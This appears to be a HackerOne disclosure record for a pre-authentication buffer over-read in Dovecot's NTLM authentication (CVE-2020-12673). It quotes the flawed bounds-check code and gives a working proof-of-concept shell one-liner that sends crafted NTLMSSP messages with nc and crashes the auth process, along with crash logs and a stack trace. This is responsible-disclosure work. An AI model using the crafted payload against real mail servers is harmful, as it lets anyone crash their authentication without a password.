{"id":866597,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NjY1OTc=","url":"https://hackerone.com/reports/866597","title":"Pre-auth buffer over-read in Dovecot NTLM implementation","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-05-05T16:25:17.593Z","submitted_at":"2020-05-05T16:25:17.593Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"orange","url":"/orange","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/051/3495315121602d0de9c4f6728fef03bc3b41d3fe_original.jpeg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8906,"url":"https://hackerone.com/open-xchange","handle":"open-xchange","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Open-Xchange","twitter_handle":"openxchange","website":"https://www.open-xchange.com/","about":"Messaging, collaboration and office productivity software for service providers"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-12673"],"singular_disclosure_disabled":true,"disclosed_at":"2020-08-13T06:43:49.855Z","bug_reporter_agreed_on_going_public_at":"2020-08-13T06:43:49.814Z","team_member_agreed_on_going_public_at":"2020-08-13T06:43:20.407Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi, Dovecot security team. \n\nI am Orange from DEVCORE security team. We just did a little security audit on the authentication mechanism of Dovecot, and found a buffer over-read in NTLM implementation.\n\nThe structure of NTLM field is defined in [ntlm-types.h](https://github.com/dovecot/core/blob/81b5b188c478ec36bea8bda8fcad1e5f32ac612b/src/lib-ntlm/ntlm-types.h#L34)\n\n```c\nstruct ntlmssp_buffer {\n\tuint16_t length;\t/* length of the buffer */\n\tuint16_t space;\t\t/* space allocated space for buffer */\n\tuint32_t offset;\t/* data offset from the start of the message */\n};\n\ntypedef struct ntlmssp_buffer ntlmssp_buffer_t;\n```\n\n\nThe security checking is in [ntlm-message.c](https://github.com/dovecot/core/blob/81b5b188c478ec36bea8bda8fcad1e5f32ac612b/src/lib-ntlm/ntlm-message.c#L176)\n```c\nstatic bool ntlmssp_check_buffer(const struct ntlmssp_buffer *buffer,\n\t\t\t\t size_t data_size, const char **error)\n{\n\tuint32_t offset = read_le32(\u0026buffer-\u003eoffset);\n\tuint16_t length = read_le16(\u0026buffer-\u003elength);\n\tuint16_t space = read_le16(\u0026buffer-\u003espace);\n\n\t/* Empty buffer is ok */\n\tif (length == 0 \u0026\u0026 space == 0)\n\t\treturn TRUE;\n\n\tif (offset \u003e= data_size) {\n\t\t*error = \"buffer offset out of bounds\";\n\t\treturn FALSE;\n\t}\n\n\tif (offset + space \u003e data_size) {\n\t\t*error = \"buffer end out of bounds\";\n\t\treturn FALSE;\n\t}\n\n\treturn TRUE;\n}\n```\n\nBefore using the NTLM authentication input, Dovecot validates the NTLM message in `ntlmssp_check_response(...)` -\u003e `ntlmssp_check_buffer(...)`. The problem is Dovecot checks the field `space` for safety but uses field `length` as the actually length. In a nutshell, Dovecot checks the wrong field. \n\nDue to this mistake, an attacker can specify an overlong length in NTLM message. For example, in [mech-ntlm.c](https://github.com/dovecot/core/blob/191321cc5d3489f48697c7212cddca6e1023c65b/src/auth/mech-ntlm.c#L221), Dovecot would like to retrieve the `username` from NTLM message, and the `length` is user controllable...\n\n\nHere is a PoC for crashing the `dove/auth` process. We make a username field with length `0x4141`. When Dovecot is copying 0x4141 bytes into heap, a SEGMENT FAULT happens because it reaches the end of the memory section.\n\n\u003e AA\\x00\\x00\\x41\\x00\\x00\\x00\n\u003e length = 0x4141\n\u003e space  = 0x0000\n\u003e offset  = 0x00000041\n\n```shell\n$ ps -ao pid,cmd | grep dovecot/auth\n 24303 dovecot/auth\n\n$ (echo 'AUTH NTLM'; echo -ne 'NTLMSSP\\x00\\x01\\x00\\x00\\x00\\x00\\x02\\x00\\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'| base64 -w0 ;echo ;echo -ne 'NTLMSSP\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00AA\\x00\\x00\\x41\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00orange\\x00'|base64 -w0;echo ; echo QUIT)  | nc 127.0.0.1 110\n+OK Dovecot ready.\n+\n+ YEkGCWCGSAGG+HMBAQMAIKZ57rqbPvt72/cCZ8HmlANewJ71bpyVpwX0E7zl2myBOGM2YWU4MWJmNjJjYWQAC3BvcDNAdWJ1bnR1\n-ERR [AUTH] Authentication failed.\n\n\n+OK Logging out\n\n$  ps -ao pid,cmd | grep dovecot/auth\n 24344 dovecot/auth\n\n$ dmsg | tail -n 1\n[130525.985669] auth[24303]: segfault at 5767e000 ip 0000000056690a98 sp 00000000fff61860 error 4 in auth[5664f000+6f000]\n```\n\n\n# Our environment\n\nWe have tested this bug on Dovecot-Core 2.3.10, and our configuration is:\n\n```\n# 2.3.10 (): dovecot.conf\n# OS: Linux 4.15.0-96-generic x86_64 Ubuntu 18.04.1 LTS\n# Hostname: ubuntu\nauth_mechanisms = plain login ntlm\ndefault_internal_user = orange\ndefault_login_user = orange\nnamespace inbox {\n  inbox = yes\n  location =\n  mailbox Drafts {\n    special_use = \\Drafts\n  }\n  mailbox Junk {\n    special_use = \\Junk\n  }\n  mailbox Sent {\n    special_use = \\Sent\n  }\n  mailbox \"Sent Messages\" {\n    special_use = \\Sent\n  }\n  mailbox Trash {\n    special_use = \\Trash\n  }\n  prefix =\n}\npassdb {\n  driver = shadow\n}\nuserdb {\n  driver = passwd\n}\n```\n\n## Impact\n\nAlthough the length is user controllable, the good `offset` field checking rescues this. We can only make a crash. But please note, the crash is before the authentication, it means an attacker can crash the REMOTE Dovecot without a password.","vulnerability_information_html":"\u003cp\u003eHi, Dovecot security team. \u003c/p\u003e\n\n\u003cp\u003eI am Orange from DEVCORE security team. We just did a little security audit on the authentication mechanism of Dovecot, and found a buffer over-read in NTLM implementation.\u003c/p\u003e\n\n\u003cp\u003eThe structure of NTLM field is defined in \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fdovecot%2Fcore%2Fblob%2F81b5b188c478ec36bea8bda8fcad1e5f32ac612b%2Fsrc%2Flib-ntlm%2Fntlm-types.h%23L34\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003entlm-types.h\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003entlmssp_buffer\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kt\"\u003euint16_t\u003c/span\u003e \u003cspan class=\"n\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e    \u003cspan class=\"cm\"\u003e/* length of the buffer */\u003c/span\u003e\n    \u003cspan class=\"kt\"\u003euint16_t\u003c/span\u003e \u003cspan class=\"n\"\u003espace\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e     \u003cspan class=\"cm\"\u003e/* space allocated space for buffer */\u003c/span\u003e\n    \u003cspan class=\"kt\"\u003euint32_t\u003c/span\u003e \u003cspan class=\"n\"\u003eoffset\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e    \u003cspan class=\"cm\"\u003e/* data offset from the start of the message */\u003c/span\u003e\n\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003etypedef\u003c/span\u003e \u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003entlmssp_buffer\u003c/span\u003e \u003cspan class=\"n\"\u003entlmssp_buffer_t\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe security checking is in \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fdovecot%2Fcore%2Fblob%2F81b5b188c478ec36bea8bda8fcad1e5f32ac612b%2Fsrc%2Flib-ntlm%2Fntlm-message.c%23L176\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003entlm-message.c\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003estatic\u003c/span\u003e \u003cspan class=\"n\"\u003ebool\u003c/span\u003e \u003cspan class=\"nf\"\u003entlmssp_check_buffer\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003entlmssp_buffer\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ebuffer\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                 \u003cspan class=\"kt\"\u003esize_t\u003c/span\u003e \u003cspan class=\"n\"\u003edata_size\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e**\u003c/span\u003e\u003cspan class=\"n\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kt\"\u003euint32_t\u003c/span\u003e \u003cspan class=\"n\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eread_le32\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ebuffer\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003eoffset\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"kt\"\u003euint16_t\u003c/span\u003e \u003cspan class=\"n\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eread_le16\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ebuffer\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"kt\"\u003euint16_t\u003c/span\u003e \u003cspan class=\"n\"\u003espace\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eread_le16\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ebuffer\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003espace\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"cm\"\u003e/* Empty buffer is ok */\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003espace\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eTRUE\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;=\u003c/span\u003e \u003cspan class=\"n\"\u003edata_size\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eerror\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;buffer offset out of bounds\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eFALSE\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003espace\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003edata_size\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eerror\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;buffer end out of bounds\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eFALSE\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eTRUE\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBefore using the NTLM authentication input, Dovecot validates the NTLM message in \u003ccode\u003entlmssp_check_response(...)\u003c/code\u003e -\u0026gt; \u003ccode\u003entlmssp_check_buffer(...)\u003c/code\u003e. The problem is Dovecot checks the field \u003ccode\u003espace\u003c/code\u003e for safety but uses field \u003ccode\u003elength\u003c/code\u003e as the actually length. In a nutshell, Dovecot checks the wrong field. \u003c/p\u003e\n\n\u003cp\u003eDue to this mistake, an attacker can specify an overlong length in NTLM message. For example, in \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fdovecot%2Fcore%2Fblob%2F191321cc5d3489f48697c7212cddca6e1023c65b%2Fsrc%2Fauth%2Fmech-ntlm.c%23L221\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003emech-ntlm.c\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, Dovecot would like to retrieve the \u003ccode\u003eusername\u003c/code\u003e from NTLM message, and the \u003ccode\u003elength\u003c/code\u003e is user controllable...\u003c/p\u003e\n\n\u003cp\u003eHere is a PoC for crashing the \u003ccode\u003edove/auth\u003c/code\u003e process. We make a username field with length \u003ccode\u003e0x4141\u003c/code\u003e. When Dovecot is copying 0x4141 bytes into heap, a SEGMENT FAULT happens because it reaches the end of the memory section.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eAA\\x00\\x00\\x41\\x00\\x00\\x00\u003cbr\u003e\nlength = 0x4141\u003cbr\u003e\nspace  = 0x0000\u003cbr\u003e\noffset  = 0x00000041\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eps \u003cspan class=\"nt\"\u003e-ao\u003c/span\u003e pid,cmd | \u003cspan class=\"nb\"\u003egrep \u003c/span\u003edovecot/auth\n 24303 dovecot/auth\n\n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;AUTH NTLM\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nt\"\u003e-ne\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;NTLMSSP\\x00\\x01\\x00\\x00\\x00\\x00\\x02\\x00\\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;\u003c/span\u003e| \u003cspan class=\"nb\"\u003ebase64\u003c/span\u003e \u003cspan class=\"nt\"\u003e-w0\u003c/span\u003e \u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nt\"\u003e-ne\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;NTLMSSP\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00AA\\x00\\x00\\x41\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00orange\\x00\u0026#39;\u003c/span\u003e|base64 \u003cspan class=\"nt\"\u003e-w0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nb\"\u003eecho \u003c/span\u003eQUIT\u003cspan class=\"o\"\u003e)\u003c/span\u003e  | nc 127.0.0.1 110\n+OK Dovecot ready.\n+\n+ YEkGCWCGSAGG+HMBAQMAIKZ57rqbPvt72/cCZ8HmlANewJ71bpyVpwX0E7zl2myBOGM2YWU4MWJmNjJjYWQAC3BvcDNAdWJ1bnR1\n\u003cspan class=\"nt\"\u003e-ERR\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eAUTH] Authentication failed.\n\n\n+OK Logging out\n\n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e ps \u003cspan class=\"nt\"\u003e-ao\u003c/span\u003e pid,cmd | \u003cspan class=\"nb\"\u003egrep \u003c/span\u003edovecot/auth\n 24344 dovecot/auth\n\n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003edmsg | \u003cspan class=\"nb\"\u003etail\u003c/span\u003e \u003cspan class=\"nt\"\u003e-n\u003c/span\u003e 1\n\u003cspan class=\"o\"\u003e[\u003c/span\u003e130525.985669] auth[24303]: segfault at 5767e000 ip 0000000056690a98 sp 00000000fff61860 error 4 \u003cspan class=\"k\"\u003ein \u003c/span\u003eauth[5664f000+6f000]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"our-environment\"\u003eOur environment\u003c/h1\u003e\n\n\u003cp\u003eWe have tested this bug on Dovecot-Core 2.3.10, and our configuration is:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# 2.3.10 (): dovecot.conf\n# OS: Linux 4.15.0-96-generic x86_64 Ubuntu 18.04.1 LTS\n# Hostname: ubuntu\nauth_mechanisms = plain login ntlm\ndefault_internal_user = orange\ndefault_login_user = orange\nnamespace inbox {\n  inbox = yes\n  location =\n  mailbox Drafts {\n    special_use = \\Drafts\n  }\n  mailbox Junk {\n    special_use = \\Junk\n  }\n  mailbox Sent {\n    special_use = \\Sent\n  }\n  mailbox \u0026quot;Sent Messages\u0026quot; {\n    special_use = \\Sent\n  }\n  mailbox Trash {\n    special_use = \\Trash\n  }\n  prefix =\n}\npassdb {\n  driver = shadow\n}\nuserdb {\n  driver = passwd\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAlthough the length is user controllable, the good \u003ccode\u003eoffset\u003c/code\u003e field checking rescues this. We can only make a crash. But please note, the crash is before the authentication, it means an attacker can crash the REMOTE Dovecot without a password.\u003c/p\u003e\n","bounty_amount":"550.0","formatted_bounty":"$550","weakness":{"id":9,"name":"Buffer Over-read"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":5,"voters":["secator","orange","mik317","geekfreak","vangogh001"],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":42899,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/dovecot/core","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7901093,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-05T16:25:32.615Z","updated_at":"2020-05-05T16:25:32.615Z","additional_data":{"old_title":"Pre-auth buffer over-read in NTLM implementation","new_title":"Pre-auth buffer over-read in Dovecot NTLM implementation"},"actor":{"username":"orange","cleared":false,"url":"/orange","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/051/3495315121602d0de9c4f6728fef03bc3b41d3fe_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7901285,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the detailed report. We'll look into this.","markdown_message":"\u003cp\u003eThank you for the detailed report. We\u0026#39;ll look into this.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-05T16:45:23.127Z","updated_at":"2020-05-05T16:45:23.127Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7901308,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Oops, I forgot to attach the stack trace. \n```\nStopped reason: SIGSEGV\nntlmssp_t_str_i (message=0x57aba680, buffer=0x57aba6a4, unicode=0x0) at ntlm-message.c:34\n34                      str_append_c(str, *p \u0026 0x7f);\ngdb-peda$ bt\n#0  ntlmssp_t_str_i (message=0x57aba680, buffer=0x57aba6a4, unicode=0x0) at ntlm-message.c:34\n#1  0x5664cfa8 in mech_ntlm_auth_continue (auth_request=0x57aba438, data=0x57a9a1b0 \"NTLMSSP\", data_size=0x48)\n    at mech-ntlm.c:221\n#2  0x56643a91 in auth_request_handler_auth_continue (handler=\u003coptimized out\u003e, args=\u003coptimized out\u003e)\n    at auth-request-handler.c:696\n#3  0x56634812 in auth_client_handle_line (\n    line=0x57ab6137 \"CONT\\t1\\tTlRMTVNTUAAD\", 'A' \u003crepeats 36 times\u003e, \"QUEAAEE\", 'A' \u003crepeats 28 times\u003e, \"CAABvcmFuZ2UA\", conn=\u003coptimized out\u003e) at auth-client-connection.c:228\n#4  auth_client_input (conn=\u003coptimized out\u003e) at auth-client-connection.c:311\n#5  0xf7e0eddb in io_loop_call_io (io=0x57ab8640) at ioloop.c:713\n#6  0xf7e10e5e in io_loop_handler_run_internal (ioloop=0x57aa29f0) at ioloop-epoll.c:222\n#7  0xf7e0eed2 in io_loop_handler_run (ioloop=0x57aa29f0) at ioloop.c:765\n#8  0xf7e0f139 in io_loop_run (ioloop=0x57aa29f0) at ioloop.c:738\n#9  0xf7d670a5 in master_service_run (service=0x57aa2920, callback=0x566323b0 \u003cclient_connected\u003e)\n    at master-service.c:809\n#10 0x56631f70 in main (argc=\u003coptimized out\u003e, argv=\u003coptimized out\u003e) at main.c:395\n#11 0xf7af2e81 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6\n#12 0x566321a1 in _start ()\n```","markdown_message":"\u003cp\u003eOops, I forgot to attach the stack trace. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eStopped reason: SIGSEGV\nntlmssp_t_str_i (message=0x57aba680, buffer=0x57aba6a4, unicode=0x0) at ntlm-message.c:34\n34                      str_append_c(str, *p \u0026amp; 0x7f);\ngdb-peda$ bt\n#0  ntlmssp_t_str_i (message=0x57aba680, buffer=0x57aba6a4, unicode=0x0) at ntlm-message.c:34\n#1  0x5664cfa8 in mech_ntlm_auth_continue (auth_request=0x57aba438, data=0x57a9a1b0 \u0026quot;NTLMSSP\u0026quot;, data_size=0x48)\n    at mech-ntlm.c:221\n#2  0x56643a91 in auth_request_handler_auth_continue (handler=\u0026lt;optimized out\u0026gt;, args=\u0026lt;optimized out\u0026gt;)\n    at auth-request-handler.c:696\n#3  0x56634812 in auth_client_handle_line (\n    line=0x57ab6137 \u0026quot;CONT\\t1\\tTlRMTVNTUAAD\u0026quot;, \u0026#39;A\u0026#39; \u0026lt;repeats 36 times\u0026gt;, \u0026quot;QUEAAEE\u0026quot;, \u0026#39;A\u0026#39; \u0026lt;repeats 28 times\u0026gt;, \u0026quot;CAABvcmFuZ2UA\u0026quot;, conn=\u0026lt;optimized out\u0026gt;) at auth-client-connection.c:228\n#4  auth_client_input (conn=\u0026lt;optimized out\u0026gt;) at auth-client-connection.c:311\n#5  0xf7e0eddb in io_loop_call_io (io=0x57ab8640) at ioloop.c:713\n#6  0xf7e10e5e in io_loop_handler_run_internal (ioloop=0x57aa29f0) at ioloop-epoll.c:222\n#7  0xf7e0eed2 in io_loop_handler_run (ioloop=0x57aa29f0) at ioloop.c:765\n#8  0xf7e0f139 in io_loop_run (ioloop=0x57aa29f0) at ioloop.c:738\n#9  0xf7d670a5 in master_service_run (service=0x57aa2920, callback=0x566323b0 \u0026lt;client_connected\u0026gt;)\n    at master-service.c:809\n#10 0x56631f70 in main (argc=\u0026lt;optimized out\u0026gt;, argv=\u0026lt;optimized out\u0026gt;) at main.c:395\n#11 0xf7af2e81 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6\n#12 0x566321a1 in _start ()\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-05-05T16:47:38.646Z","updated_at":"2020-05-05T16:47:38.646Z","actor":{"username":"orange","cleared":false,"url":"/orange","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/051/3495315121602d0de9c4f6728fef03bc3b41d3fe_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7907751,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-06T06:08:28.668Z","updated_at":"2020-05-06T06:08:28.668Z","additional_data":{"old_severity":"Medium","new_severity":"High 